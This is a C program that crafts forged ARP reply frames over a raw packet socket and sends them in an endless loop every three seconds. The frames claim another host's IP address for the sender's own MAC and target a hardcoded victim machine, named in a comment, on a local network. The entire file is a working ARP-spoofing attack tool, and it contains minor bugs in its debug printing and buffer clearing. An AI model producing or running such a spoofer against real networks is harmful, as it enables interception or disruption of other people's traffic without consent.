#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
 
#include <asm/types.h>
 
#include <math.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
 
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
 
#define BUF_SIZE 256
#define DEVICE "enp3s0"

struct __attribute__((packed)) arp_header
{
    unsigned short htype;
    unsigned short ptype;
    unsigned char hlen;
    unsigned char plen;
    unsigned short opcode;
    unsigned char sender_mac[6];
    unsigned char sender_ip[4];
    unsigned char target_mac[6];
    unsigned char target_ip[4];
};


//void* buffer = NULL;
long total_packets = 0;
long answered_packets = 0;
 void print_mac_address(uint8_t mac[6])
{
  for (int i=0; i<5; i++) {
    printf ("%02x:", mac[i]);
  }
  printf ("%02x\n", mac[5]);
   
}
void print_ip(unsigned char ip[4])
{
  for(int i=0;i<3;i++)
  {
    printf("%d.",ip[i]);
  }
  printf("%d \n",ip[3]);
  printf("\n");
}
void print_ethernet_header(void *Buffer, int Size)
{
    struct ethhdr *eth = (struct ethhdr *)Buffer;
     
    printf("\n");
    printf("Ethernet Header\n");
    printf("   |-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_dest[0] , eth->h_dest[1] , eth->h_dest[2] , eth->h_dest[3] , eth->h_dest[4] , eth->h_dest[5] );
    printf("   |-Source Address      : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_source[0] , eth->h_source[1] , eth->h_source[2] , eth->h_source[3] , eth->h_source[4] , eth->h_source[5] );
    printf("   |-Protocol            : %u \n",(unsigned short)eth->h_proto);
}
void print_arp_header(void *Buffer, int Size )
{
  struct arp_header *ah = (struct arp_header *)(Buffer+sizeof(struct ethhdr));
  printf("\n\n");
  printf("ARP header\n");
  printf("sender_mac\n");
  print_mac_address(ah->sender_mac);
  printf("target_mac\n");
  print_mac_address(ah->target_mac);
  printf("target ip \n");
  print_ip(ah->target_ip);
  printf("sender ip\n");
  print_ip(ah->target_ip);
  printf("%d || %d  || %d || %d || %d \n",ah->hlen,ah->htype,ah->ptype,ah->plen,ah->opcode);
}
void copy_addr(unsigned char a[],unsigned char b[] , int n)
{
  for(int i=0;i<n;i++)
  {
    a[i]=b[i];
  }
}
int main()
{
    
    void * buffer = (void *)malloc(BUF_SIZE); // ethernet frame 
    unsigned char* etherhead = buffer;   
    struct ethhdr *eh = (struct ethhdr *)etherhead; // pointer to extract ethernet header
    unsigned char* arphead = buffer + 14;
    struct arp_header *ah = (struct arp_header *)arphead; // pointer to extract arp header
    uint8_t src_mac[6];        /*our MAC address*/
    struct ifreq ifr;
    struct sockaddr_ll socket_address;
    int ifindex = 0;         /*Ethernet Interface index*/
    int i;
    int length;      /*length of received packet*/
    int sent;
    unsigned char src_ip[]={0xAC,0x1E,0xEC,0xB5}; // my ip
   unsigned char dst_ip[]= {0xAC,0x1E,0xEB,0xCE}; // revanth
   unsigned char gateway[] = {0xAC,0x1E,0xE8,0x06}; // gateway
    int rsfd = socket(PF_PACKET,SOCK_RAW, htons(ETH_P_ALL));
   // inet_pton(AF_INET,"172.30.236.181",src_ip);
    //inet_pton(AF_INET,"172.30.235.126",dst_ip);
    printf("sizeof ethernet header + sizeof arp header  %d \n",(int)(sizeof(struct ethhdr)+sizeof(struct arp_header)));
     printf("source ip : ");
     print_ip(src_ip);
     printf("dest ip :  ");
     print_ip(dst_ip);
    uint8_t dst_mac[] = {0x48,0xba,0x4e,0x40,0xd5,0xdb};
    if(rsfd < 0)
    {
      perror("socket failed");
      exit(EXIT_FAILURE);
    }
  memset(buffer,0,sizeof(buffer));
    strncpy(ifr.ifr_name, DEVICE, IFNAMSIZ);
    if (ioctl(rsfd, SIOCGIFINDEX, &ifr) == -1)
    {
        perror("SIOCGIFINDEX");
        exit(1);
    }
    ifindex = ifr.ifr_ifindex;
    printf("Successfully got interface index: %i\n", ifindex);
 
        
    if (ioctl(rsfd, SIOCGIFHWADDR, &ifr) == -1) // for getting  mac address
    {
            perror("SIOCGIFINDEX");
            exit(1);
    }
    memcpy (src_mac, ifr.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t)); // pushing the srcmac address
    // printf("Source mac address : ");
    // print_mac_address(src_mac);
    //memset (dst_mac, 0xff, 6 * sizeof (uint8_t));
    // printf("dest mac : ");
    // print_mac_address(dst_mac);

  socket_address.sll_family = AF_PACKET;
  socket_address.sll_protocol = htons(ETH_P_ARP);
  socket_address.sll_ifindex = ifindex;
  socket_address.sll_hatype = ARPHRD_ETHER;
  socket_address.sll_pkttype = 0; //PACKET_OTHERHOST;
  socket_address.sll_halen = 0;
  copy_addr (socket_address.sll_addr, dst_mac, 6);
  socket_address.sll_addr[6] = 0;
  socket_address.sll_addr[7] = 0;
  ah->htype = htons(1);
  ah->ptype = htons(ETH_P_IP);
  ah->hlen = 6;
  ah->plen = 4;
  ah->opcode = htons(ARPOP_REPLY);
  
  copy_addr(ah->sender_mac,src_mac,6);
  copy_addr(ah->target_mac,dst_mac,6);
  copy_addr(ah->sender_ip,dst_ip,4);
  copy_addr(ah->target_ip,gateway,4);
  copy_addr(eh->h_dest,dst_mac,6);
  copy_addr(eh->h_source,src_mac,6);
  eh->h_proto = htons(ETH_P_ARP);
  print_ethernet_header(buffer,BUF_SIZE);
  print_arp_header(buffer,BUF_SIZE);
  if(rsfd < 0)
  {
    perror("socket failed");
    exit(EXIT_FAILURE);
  }

  while(1)
  {
    if(sendto(rsfd,buffer,46,0,(struct sockaddr *)&socket_address,sizeof(socket_address))<0)
  {
    perror("send to failure");
    exit(EXIT_FAILURE);
  }
  sleep(3);
 
  }
   close(rsfd);
}